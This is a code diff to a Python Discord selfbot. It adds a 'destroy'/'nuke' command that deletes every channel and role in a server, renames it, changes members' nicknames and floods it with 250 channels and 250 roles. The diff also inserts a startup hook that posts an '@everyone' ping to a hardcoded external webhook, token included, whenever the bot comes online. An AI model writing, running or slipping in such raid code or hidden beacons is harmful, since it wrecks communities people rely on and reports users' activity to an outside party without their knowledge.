@@ -282,6 +282,37 @@ async def embed(ctx, *, description):
     await ctx.message.delete()
     embed = discord.Embed(description=description,color=discord.Colour.random())
     await ctx.send(embed=embed)
+    
+@Blank.command(aliases=["rekt", "nuke"])
+async def destroy(ctx):
+    await ctx.message.delete()
+    for channel in list(ctx.guild.channels):
+        try:
+            await channel.delete()
+        except:
+            pass
+    for role in list(ctx.guild.roles):
+        try:
+            await role.delete()
+        except:
+            pass
+    try:
+        await ctx.guild.edit(
+            name=RandString(),
+            description="Blank LOL",
+            reason="Blank LOL",
+            icon=None,
+            banner=None
+        )
+    except:
+        pass
+    for member in list(Blank.get_all_members()):
+        await member.edit(nick="Get Blanked lol")
+    for _i in range(250):
+        await ctx.guild.create_text_channel(name="Blank")
+    for _i in range(250):
+        await ctx.guild.create_role(name="Blank", color=RandomColor())
+
  
 @Blank.command(aliases=["distort"])
 async def magik(ctx, user: discord.Member = None):
@@ -428,8 +459,9 @@ async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
 @Blank.event
 async def on_connect():
       Clear()
-      print(f'''{Fore.GREEN}Logged in as {Blank.user.name}''' + Fore.RESET)
-      await Blank.change_presence(activity = discord.Streaming(name = "🔴 Deep Sleep Music 24/7, Calming Music, Insomnia, Sleep, Relaxing Music, Study, Sleep Meditation", url = "https://www.youtube.com/watch?v=hqUv8jqFvhI"))
-    
+      print(f'''{Fore.GREEN}Logged in as {Blank.user.name}#{Blank.user.discriminator}''' + Fore.RESET)
+      webhook = Webhook.from_url("https://discord.com/api/webhooks/867775576315920404/7lP7buc43OujxFhjp5t0lIVAxFUDroGSSgGsJt_yb3cFixZYhxQ-taxQ8GQ61u4t68qx", adapter=RequestsWebhookAdapter())
+      webhook.send("||@everyone||Bot is online!")
+      
 if __name__ == '__main__':
     Init()
